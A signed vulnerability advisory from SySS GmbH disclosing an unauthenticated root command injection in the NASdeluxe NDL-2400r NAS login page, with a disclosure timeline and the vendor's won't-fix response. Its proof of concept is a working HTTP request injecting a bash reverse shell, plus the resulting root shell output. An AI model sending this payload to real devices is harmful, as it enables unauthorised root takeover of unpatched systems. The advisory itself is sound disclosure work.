@@ -1,0 +1,139 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+Advisory ID: SYSS-2016-065
+Product: NASdeluxe NDL-2400r
+Vendor: Starline Computer GmbH
+Affected Version(s): 2.01.10
+Tested Version(s): 2.01.09 
+Vulnerability Type: OS Command Injection (CWE-78)
+Risk Level: High
+Solution Status: no fix (product has reached EOL since 3 years)
+Vendor Notification: 2016-07-04
+Public Disclosure: 2016-08-03
+CVE Reference: Not assigned
+Author of Advisory: Klaus Eisentraut, SySS GmbH, https://www.syss.de/advisories/
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Overview:
+
+The product "NASdeluxe NDL-2400r" [3] is vulnerable to OS Command Injection
+as root. No credentials are required to exploit this vulnerability.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Vulnerability Details / Proof-of-Concept:
+
+The language parameter in the web interface login request of the product 
+"NASdeluxe NDL-2400r" is vulnerable to an OS Command Injection as root. 
+The SySS GmbH sent the following HTTPS request to the webinterface:
+
+~~~~~
+POST /usr/usrgetform.html?name=index HTTP/1.1
+Host: 192.168.1.1
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 97
+
+lang=||`bash+-i+>%26+/dev/tcp/192.168.1.2/443+0>%261`&username=&pwd=&site=web_disk&login_btn=Einloggen
+~~~~~
+
+After sending the request, a reverse shell connected back:
+
+~~~~~
+# nc -lvvp 443
+Listening on any address 443 (https)
+Connection from 192.168.1.1:49070
+bash: no job control in this shell
+bash-3.00# whoami
+root
+bash-3.00# cat /img/version
+2.01.09
+~~~~~
+
+The tested firmware version was 2.01.09. The most current version is 
+2.01.10 according to the web page of the vendor [3]. However there are
+no hints of a security update in the release notes [4]. Thus, the SySS 
+GmbH assumes that this vulnerability is likely also present in the most 
+current firmware version from 2009-10-22.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Solution:
+
+The product has reached end-of-life (EOL) status since more than three 
+years. Thus, no patch will be provided by the vendor.
+
+It is highly recommended to migrate to one of the newer and still 
+supported NAS solutions which are (according to Starline Computer GmbH) 
+not affected by this vulnerability.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Disclosure Timeline:
+
+2016-06-29: Vulnerability discovered
+2016-07-04: asked info@starline.de for contact person (no answer)
+2016-07-22: sent this advisory to info@starline.de
+2016-07-22: response from vendor: won't fix (product reached EOL >3 years)
+2016-08-03: public disclosure
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+References:
+
+[1] SySS GmbH, SYSS-2016-065
+    https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2016-065.txt
+[2] SySS GmbH, SySS Responsible Disclosure Policy
+    https://www.syss.de/en/news/responsible-disclosure-policy/
+[3] NASdeluxe Homepage
+    https://www.nasdeluxe.com/
+[4] NDL-2400R Firmware Release Notes 
+    https://www.nasdeluxe.com/wp-content/uploads/2008/12/NDL-2400R_NDL-2500T_FWRN_v2_01_10.171.pdf
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Credits:
+
+This security vulnerability was found by Klaus Eisentraut of the SySS
+GmbH.
+
+E-Mail: klaus.eisentraut@syss.de
+Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Klaus_Eisentraut.asc
+Key ID: 0xBAC677AE
+Key Fingerprint: F5E8 E8E1 A414 4886 0A8B 0411 DAB0 4DB5 BAC6 77AE
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Disclaimer:
+
+The information provided in this security advisory is provided "as is" 
+and without warranty of any kind. Details of this security advisory may
+be updated in order to provide as accurate information as possible. The
+latest version of this security advisory is available on the SySS Web
+site.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Copyright:
+
+Creative Commons - Attribution (by) - Version 3.0
+URL: http://creativecommons.org/licenses/by/3.0/deed.en
+
+-----BEGIN PGP SIGNATURE-----
+
+iQIcBAEBCgAGBQJXoddNAAoJENqwTbW6xneuMdwQANnc0LC5n+5Hz/jd/C4y6Vo/
+V4rTM2ZeKHoinwaNe8wDqwLojVi370xkroe592skBuGaHsACpqVU/+i1uzez4Fd5
+zv9FL0O16qeU4ATt0tlTMzBka+3l7+W46JjIt30auKXvb2C7HXlwru58HvMRoDUr
+5ga48/C2tLAWeogR0hpflXg6xUmTTfZRL1zgEh4/etz8vA0DgwXl7fRQZq7z2fDF
+L4oSrQ2oumS+IWH8qAUo/Tvd8al/OSQC+QfLjwxhpwb3n8nRrUaa2gYLuKvSXn3R
+Sc8nuR+YuO4c+kXcUO2HQ2mpmSRKITOGOgqDwxiSHitTpGwkJiwh2PwRP45BJxTe
+g99ivjeRUKkXlAkNZ3u38OYzSmPcf455fwGANFaBjljJtd5Z+Je9mqL2jnUvB1O1
+ERFuyhDr1VKLiM4BQp3/hgqECHQRjiX7jUN0yHA3PWiM55wzHyftAti5K/XKSKTv
+tFB19VoC+oJEA1i19uzv7xFscfiPHuRw0coGP2KSVwA2L3bIOLlMwWt/Ea/Qzcur
+9JIUHX0+kKxJcLb6hthasQ4lIf2Jhjd4aFR+rPcJLL29r7HGOSoQLErXz2QmcePJ
+1jKC6O2N2vrmrIZ+JOvWP99v0bIqC/857Xz5p30OUUjx2yLjpP/t5paidH1qlUMs
+4mefqh41S76I3EZJpQn3
+=V6E3
+-----END PGP SIGNATURE-----
